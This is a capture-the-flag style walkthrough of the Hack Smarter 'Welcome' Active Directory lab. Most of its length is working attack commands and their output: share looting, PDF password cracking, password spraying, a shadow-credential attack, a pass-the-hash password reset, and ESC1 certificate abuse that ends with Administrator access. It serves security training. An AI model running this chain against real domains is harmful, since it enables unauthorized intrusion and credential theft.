---
title: "Hack Smarter Welcome Lab"
date: 2025-10-31 00:00:00 +0800
categories: [Hack Smarter Lab]
tags: [password-spray, force-password-with-hash, shadow-credential, ESC1, active-directory, privilege-escalation]
difficulty: Easy
author: 0xmr
platform: Hack Smarter
image: /assets/img/posts/welcome-lab.png
excerpt: "A comprehensive walkthrough of the Welcome Lab on Hack Smarter covering generic-all, force-password-with-hash, password-spray, and ADCS techniques."
---

# Welcome Lab Walkthrough

## Objective / Scope

> You are a member of the Hack Smarter Red Team. During a phishing engagement you obtained credentials for the client's Active Directory environment. Use those credentials to enumerate the environment, escalate privileges, and demonstrate impact for the client.

**Starting credentials**

```
e.hills:Il0vemyj0b2025!
```


## Export target

```bash
export target=$target-ip-here
```

## Discovering target hostname

```bash
└─# NetExec smb $target
    10.1.161.123    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:False)
```

### Scanning

Initial port scan shows common Windows services and an Active Directory environment. Port `389` leaks the domain name `DC01.WELCOME.local` and `WELCOME.local` — indicating an AD machine. Add the domain to `/etc/hosts` so it resolves to the target IP.

```bash
rustscan -a $target -- -A

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2025-11-06 17:04:52Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: WELCOME.local, Site: Default-First-Site-Name)
|_ssl-date: 2025-11-06T17:06:33+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DC01.WELCOME.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.WELCOME.local
| Issuer: commonName=WELCOME-CA/domainComponent=WELCOME
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP
3269/tcp  open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49687/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49689/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49720/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49756/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
```

## Shares

User `e.hills` has permission to read the Human Resources share. I used `smbclient` to connect and download the PDFs. One file was password-protected, so I cracked the PDF password to check its contents — it contained an initial joining password for a user who had not changed it. I then password-sprayed the account list and found a hit for `a.harris`.

> I also set `recurse OFF` and `prompt OFF` in `smbclient` to prevent interactive prompts while downloading. Then I used `mget *` to fetch all files.

```bash
└─# smbclient \\\DC01.WELCOME.local\\"Human Resources" -U 'welcome.local/e.hills%Il0vemyj0b2025!'
Try "help" to get a list of possible commands.
smb: \> recurse OFF
smb: \> prompt OFF
smb: \> mget *
getting file \Welcome 2025 Holiday Schedule.pdf of size 84715 as Welcome 2025 Holiday Schedule.pdf (44.9 KiloBytes/sec)
getting file \Welcome Benefits.pdf of size 81466 as Welcome Benefits.pdf (54.3 KiloBytes/sec)
getting file \Welcome Handbook Excerpts.pdf of size 82644 as Welcome Handbook Excerpts.pdf (55.1 KiloBytes/sec)
getting file \Welcome Performance Review Guide.pdf of size 79823 as Welcome Performance Review Guide.pdf (66.4 KiloBytes/sec)
getting file \Welcome Start Guide.pdf of size 89511 as Welcome Start Guide.pdf (74.3 KiloBytes/sec)
```

### PDF password cracking

```bash
└─# pdf2john 'Welcome Start Guide.pdf' > welcome-guide.hash

└─# cat welcome-guide.hash
Welcome Start Guide.pdf:$pdf$4*4*128*-1060*1*16*fc591b1749ad08498b60ce3a81947b8c*32*9abeeb4695a10ac7b5e6558d39ee8c8300000000000000000000000000000000*32*e3e7eecc056a1ca2a2b0298352b0970f96ff1503022a1146e322e2f215dfd6be

└─# john welcome-guide.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
humanresources   (Welcome Start Guide.pdf)        <=== password
```

## User list creation

```bash
└─# NetExec smb $target -u 'e.hills' -p 'Il0vemyj0b2025!' --users
SMB         10.1.161.123    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:False)
SMB         10.1.161.123    445    DC01             [+] WELCOME.local\\e.hills:Il0vemyj0b2025!
SMB         10.1.161.123    445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.1.161.123    445    DC01             Administrator                 2025-09-13 16:24:04 0       Built-in account for administering the computer/domain
SMB         10.1.161.123    445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.1.161.123    445    DC01             krbtgt                        2025-09-13 16:40:39 0       Key Distribution Center Service Account
SMB         10.1.161.123    445    DC01             e.hills                       2025-09-13 20:41:15 0
SMB         10.1.161.123    445    DC01             j.crickets                    2025-09-13 20:43:53 0
SMB         10.1.161.123    445    DC01             e.blanch                      2025-09-13 20:49:13 0
SMB         10.1.161.123    445    DC01             i.park                        2025-09-14 04:23:03 0       IT Intern
SMB         10.1.161.123    445    DC01             j.johnson                     2025-09-13 20:58:15 0
SMB         10.1.161.123    445    DC01             a.harris                      2025-09-13 20:59:13 0
SMB         10.1.161.123    445    DC01             svc_ca                        2025-09-14 00:19:35 0
SMB         10.1.161.123    445    DC01             svc_web                       2025-09-13 21:40:40 0       Web Server in Progress
SMB         10.1.161.123    445    DC01             [*] Enumerated 11 local users: WELCOME
```

```bash
=======>  NetExec smb $target -u 'e.hills' -p 'Il0vemyj0b2025!' --users   > raw.txt
=======>  cat raw.txt | awk '{print $5}' > user.txt
```

## Password spray

```bash
└─# NetExec smb $target -u 'users' -p 'passwords' --continue-on-success
SMB         10.1.161.123    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:False)
... (truncated output)
SMB         10.1.161.123    445    DC01             [+] WELCOME.local\a.harris:Welcome2025!@  <=== Hit
... (truncated output)
SMB         10.1.161.123    445    DC01             [+] WELCOME.local\e.hills:Il0vemyj0b2025!  <=== Hit
```

# BloodHound collection

```bash
└─# NetExec ldap $target -u 'e.hills' -p 'Il0vemyj0b2025!' --bloodhound --collection All --dns-server $target
LDAP        10.1.161.123    389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:WELCOME.local) (signing:None) (channel binding:Never)
LDAP        10.1.161.123    389    DC01             [+] WELCOME.local\e.hills:Il0vemyj0b2025!
LDAP        10.1.161.123    389    DC01             Resolved collection methods: objectprops, psremote, group, rdp, acl, trusts, container, dcom, localadmin, session
LDAP        10.1.161.123    389    DC01             Done in 0M 58S
LDAP        10.1.161.123    389    DC01             Compressing output into /root/.nxc/logs/DC01_10.1.161.123_2025-11-06_224658_bloodhound.zip
```

## Generic All / Shadow Credential

After reviewing the BloodHound data, I observed that `i.park` has outbound control. I performed a shadow-credential attack to steal the NTLM hash.

```bash
└─# certipy-ad shadow auto -username a.harris@welcome.local -password 'Welcome2025!@' -account i.park
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: WELCOME.LOCAL.
[!] Use -debug to print a stacktrace
[*] Targeting user 'i.park'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '2059db17a08a47be8f8bb83c9c78eebc'
[*] Adding Key Credential with device ID '2059db17a08a47be8f8bb83c9c78eebc' to the Key Credentials for 'i.park'
[*] Successfully added Key Credential with device ID '2059db17a08a47be8f8bb83c9c78eebc' to the Key Credentials for 'i.park'
[*] Authenticating as 'i.park' with the certificate
[*] Using principal: 'i.park@welcome.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'i.park.ccache'
[*] Wrote credential cache to 'i.park.ccache'
[*] Trying to retrieve NT hash for 'i.park'
[*] Restoring the old Key Credentials for 'i.park'
[*] Successfully restored the old Key Credentials for 'i.park'
[*] NT hash for 'i.park': b689c61b88b0f63cfc2033e5dba52c75
```

## Force password change (Pass-the-Hash)

`i.park` has outbound control over users `svc_ca` and `svc_web`.

```bash
└─# pth-net rpc password "svc_ca" -U "welcome.local"/"i.park"%"ffffffffffffffffffffffffffffffff":"b689c61b88b0f63cfc2033e5dba52c75" -S "DC01.WELCOME.local"
Enter new password for svc_ca:
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM hash...  # password set to password@123!
```

## ADCS enumeration

The `svc_ca` account name suggests a Certificate Authority role. I used `certipy-ad` to enumerate templates and CA configuration and confirmed an ESC1 vulnerability on the `Welcome-Template`.

```bash
└─# certipy-ad find -u svc_ca@welcome.local -p 'password@123!' -dc-ip 10.1.161.123 -stdout -vulnerable
Certipy v5.0.3 - by Oliver Lyak (ly4k)
[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 17 issuance policies
[*] Retrieving CA configuration for 'WELCOME-CA' via RRP
[*] Successfully retrieved CA configuration for 'WELCOME-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : WELCOME-CA
    DNS Name                            : DC01.WELCOME.local
    Certificate Subject                 : CN=WELCOME-CA, DC=WELCOME, DC=local
    Certificate Serial Number           : 6E7A025A45F4E6A14E1F08B77737AFD9
    Certificate Validity Start          : 2025-09-13 16:39:33+00:00
    Certificate Validity End            : 2030-09-13 16:49:33+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : WELCOME.LOCAL\Administrators
      Access Rights
        ManageCa                        : WELCOME.LOCAL\Administrators
                                          WELCOME.LOCAL\Domain Admins
                                          WELCOME.LOCAL\Enterprise Admins
        ManageCertificates              : WELCOME.LOCAL\Administrators
                                          WELCOME.LOCAL\Domain Admins
                                          WELCOME.LOCAL\Enterprise Admins
        Enroll                          : WELCOME.LOCAL\Authenticated Users
Certificate Templates
  0
    Template Name                       : Welcome-Template
    Display Name                        : Welcome-Template
    Certificate Authorities             : WELCOME-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : PublishToDs
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-09-14T03:12:52+00:00
    Template Last Modified              : 2025-10-30T02:19:35+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : WELCOME.LOCAL\svc_ca
                                          WELCOME.LOCAL\Domain Admins
                                          WELCOME.LOCAL\Enterprise Admins
    [+] User Enrollable Principals      : WELCOME.LOCAL\svc_ca
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

# ESC1 attack (issue a certificate)

```bash
└─# certipy-ad req -username 'svc_ca@welcome.local' -password 'password@123!' -ca WELCOME-CA -target $target -template Welcome-Template -upn Administrator@welcome.local
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: WELCOME.LOCAL.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 21
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@welcome.local'
[*] Certificate has no object SID
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

└─# certipy-ad auth -pfx administrator.pfx -dc-ip $target
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@welcome.local'
[*] Using principal: 'administrator@welcome.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@welcome.local': aad3b435b51404eeaad3b43551404ee:0cf1b799460a39c852068b7c0574677a
```

## Root flag capture

```bash
evil-winrm -i welcome.local -u 'administrator' -H 0cf1b799460a39c852068b7c0574677a
```

---

*Notes & recommendations (for client):*
- Rotate any accounts that used default or documented initial passwords.
- Enforce password change at first logon for all accounts created from HR onboarding documents.
- Restrict certificate template enrollment permissions and review templates that allow client authentication with `EnrolleeSuppliesSubject` flags.
- Monitor for unusual certificate requests and registrations.
